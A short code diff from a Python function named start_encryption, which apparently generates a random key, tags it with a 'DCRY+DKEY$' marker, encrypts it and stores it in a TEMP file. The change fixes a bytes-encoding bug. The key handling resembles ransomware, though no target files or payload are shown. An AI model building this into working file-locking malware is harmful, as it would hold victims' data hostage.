@@ -319,7 +319,7 @@ def start_encryption():
     id = uuid.uuid1()
     key = get_random_bytes(16)
     key_b64 = base64.urlsafe_b64encode(b"DCRY+DKEY$" + key).decode()
-    encrypted_key = encrypt_key(key_b64)
+    encrypted_key = encrypt_key(key_b64.encode())
     with open(os.path.join(os.environ["TEMP"], "key.bin"), "wb") as f:
         f.write(encrypted_key)
     with open(os.path.join(os.environ["TEMP"], "key.bin"), "rb") as f:
